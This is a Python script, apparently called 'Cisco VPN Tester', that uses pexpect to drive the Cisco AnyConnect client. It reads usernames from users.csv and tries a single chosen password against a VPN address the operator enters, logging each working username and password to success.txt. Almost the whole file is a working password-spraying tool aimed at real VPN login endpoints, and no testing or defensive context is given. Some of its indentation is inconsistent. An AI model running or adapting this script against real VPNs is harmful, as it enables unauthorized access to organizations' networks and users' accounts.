#!/usr/bin/env python


import sys
import os
import csv
import pexpect
import time

runonce = 0
i = ''

dirname, filename = os.path.split(os.path.abspath(__file__))
usercsv = 'users.csv'
lines = open(os.path.join(dirname,usercsv)).read().splitlines()
username_limit = len(lines)#gets column length of users csv
username_count = 1

def banner():
	print("  _____ _                 _   _______ _   _   _____         _            ")
	print(" /  __ (_)               | | | | ___ \ \ | | |_   _|       | |           ")
	print(" | /  \/_ ___  ___ ___   | | | | |_/ /  \| |   | | ___  ___| |_ ___ _ __ ")
	print(" | |   | / __|/ __/ _ \  | | | |  __/| . ` |   | |/ _ \/ __| __/ _ \ '__|")
	print(" | \__/\ \__ \ (_| (_) | \ \_/ / |   | |\  |   | |  __/\__ \ ||  __/ |   ")
	print("  \____/_|___/\___\___/   \___/\_|   \_| \_/   \_/\___||___/\__\___|_|   ")
	print("                                                                         ")
	print("                                                                         ")
	print(" ______           ____________  ____   _ _   __                          ")
	print(" | ___ \         |_  |  _  \  \/  | | | | | / /                          ")
	print(" | |_/ /_   _      | | | | | .  . | | | | |/ /                           ")
	print(" | ___ \ | | |     | | | | | |\/| | | | |    \                           ")
	print(" | |_/ / |_| | /\__/ / |/ /| |  | | |_| | |\  \                          ")
	print(" \____/ \__, | \____/|___/ \_|  |_/\___/\_| \_/                          ")
	print("         __/ |                                                           ")
	print("        |___/                   Version 1.0  					                \n")
	print(" Instructions: Use users.csv for usernames \n")
	if os.path.exists('/opt/cisco/anyconnect/bin/vpn') == False:
		print("!!! ERROR: Cisco Anyconnect Missing. Please install before running !!!\n")
		sys.exit(0)

def connection(address, vpngroup, username, password):
  child = pexpect.spawn('/opt/cisco/anyconnect/bin/vpn connect ' + address, maxread=2000)
  p = child.expect(['error: Could not connect to server. ', 'Certificate does not match the server name','Group: \[.*\]', 'state: Connected', pexpect.TIMEOUT, pexpect.EOF], timeout=3) #handles responses, catches EOF exception to prevent crashing
  if (p==0) or (p>=4): 
  	print("Server not responding, please try again")
	child.kill(0)
	main()
  if p==1:
	child.sendline('y')
	o = child.expect(['>> warning: Connection attempt has failed.','Group: \[.*\]'])
	if o == 0:
		print("Connected made but rejected, please try again")
		child.kill(0)
		main()
	if o == 1:
		child.sendline(vpngroup)
  if p==2:
	child.sendline(vpngroup)
  if p==3:
	print("Currently connected, sending disconnect request..\n")
	child.kill(0)
	child = pexpect.spawn('/opt/cisco/anyconnect/bin/vpn disconnect ', maxread=2000)
	child.kill(0)
    	time.sleep(2) #gives chance to catchup with itself
	main()
  print("Trying %s...\n" % username)
  print ("Connecting...")
  child.logfile = sys.stdout
  child.expect('Username: \[.*\]')
  child.sendline(username)
  child.expect('Password:')
  child.logfile = None
  child.sendline(password)
  child.logfile = sys.stdout
  i = child.expect (['state: Connected', '>> Login failed.'])
  if i==0:
    print("state: Connected")
    f = open(os.path.join(dirname,'success.txt'), 'a+')
    f.write("\n")
    f.write("Working Combo: " + username)
    f.write(" ")
    f.write(password)
    f.close()
    global success
    success +=1
    print("Matched password, disconnecting before trying next one..\n")
    child = pexpect.spawn('/opt/cisco/anyconnect/bin/vpn disconnect ', maxread=2000)
    time.sleep(2) #gives chance to catchup with itself
  elif i==1:
    print("\n")
    print("Login Failed for %s\n" % username)
  child.kill(0)
  global username_count
  username_count +=1 


def main():
	if os.path.exists(os.path.join(dirname, usercsv)) == False:
		print("!!! Users.csv missing, creating new one !!!\n")
		sys.exit(0)
	global runonce
	if runonce == 0: #Prevents the banner from re-appearing 
		global success
		banner()
		success = 0
		runonce += 1
	vpngroup = raw_input('Enter VPN group. NUMBER ONLY: ')
	if vpngroup.isdigit(): #Input Validation for VPN group, just the number is required
		address = raw_input('Enter the address you want to test: ')
		password = raw_input('Enter password you want to test: ')
		print("Locked and loaded, lets try!\n")
		while (username_count) != (username_limit): #loops through list, skips username header
			username = lines[username_count]
			connection(address, vpngroup, username, password)
		else:
			if success !=0:
				print("List Completed. See output file for details. \n")
				sys.exit(0)
			else:
				print("List Completed. No matches found. \n")
				sys.exit(0)
	else:
		print('Please enter a positive number.')
		main()

# call main()
if __name__ == '__main__':
	main()
